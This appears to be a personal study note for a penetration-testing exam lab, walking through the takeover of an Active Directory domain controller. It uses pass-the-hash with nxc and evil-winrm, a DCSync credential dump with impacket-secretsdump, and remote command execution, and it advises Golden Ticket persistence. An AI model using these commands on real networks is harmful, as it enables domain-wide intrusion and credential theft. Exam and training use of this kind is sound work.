# 🎯 DC01 — Exam Solve Guide (Domain)

> The **domain controller** — the graded box. Pattern: pass-the-hash the Domain Admin credential you pulled off MS02 → DCSync the domain → grab proof. Values are placeholders.

Part of [[Active Directory]] · [[AD Attack Framework]]. Prev: [[MS02 — Exam Solve Guide (Lateral)|MS02]] · overview: [[Exam AD Set — Solve Overview]].

```bash
export DC=<DC_IP> DOMAIN=<domain.tld>
echo "$DC DC01.$DOMAIN $DOMAIN" | sudo tee -a /etc/hosts ; sudo ntpdate $DC
```

## 1. Access — pass-the-hash the DA
```bash
nxc smb $DC -u Administrator -H <DA_NTHASH>          # (name:DC01)(DC:True)(Pwn3d!)
evil-winrm -i $DC -u Administrator -H <DA_NTHASH>    # interactive, if you want a shell
```
([[Pass-the-Hash]]) If you only have the DA **password**, use `-u Administrator -p '<pass>'` instead.

## 2. DCSync — dump the domain
```bash
impacket-secretsdump $DOMAIN/Administrator@$DC -hashes :<DA_NTHASH> -just-dc-ntlm
```
Pull **Administrator**, **krbtgt** (golden-ticket capable), and every service/user hash. ([[DCSync & Domain Dominance]])

## 3. Proof
```bash
nxc smb $DC -u Administrator -H <DA_NTHASH> -x "type C:\Users\Administrator\Desktop\proof.txt"
```
Screenshot the flag with the target IP (`ipconfig`) + `whoami` showing `administrator`/SYSTEM in frame ([[Exam Workflow]]).

## ✅ Domain owned
- **krbtgt** hash → Golden Ticket for persistence / any-user access ([[DCSync & Domain Dominance]]).
- Reuse every recovered hash across the whole set — the AD set is one network ([[Credential Reuse]]).
- Submit the DC proof; track changes for [[Post-Engagement Cleanup]].

## 🔑 Exam reminders
- A DA **hash** is enough — **pass it, don't crack it**.
- `-just-dc-ntlm` is the fast path when you only need NTLM for PtH; drop it for full secrets.
- If PtH is refused: verify it's the **NT** hash and the username/format, and that the clock is synced.
